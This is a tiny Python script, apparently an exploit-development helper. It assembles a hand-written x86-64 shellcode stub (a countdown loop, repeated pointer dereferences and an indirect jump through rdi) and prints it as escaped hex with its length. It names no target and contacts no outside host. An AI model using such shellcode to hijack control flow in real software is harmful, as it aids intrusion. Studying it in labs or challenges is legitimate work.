#!/usr/bin/python3
sc=b"\xff\xc8\x75\xfc"+b"H\x8b?"*3+b"\x90\xff\x27"
print(''.join(['\\x%02x' % b for b in sc]),len(sc))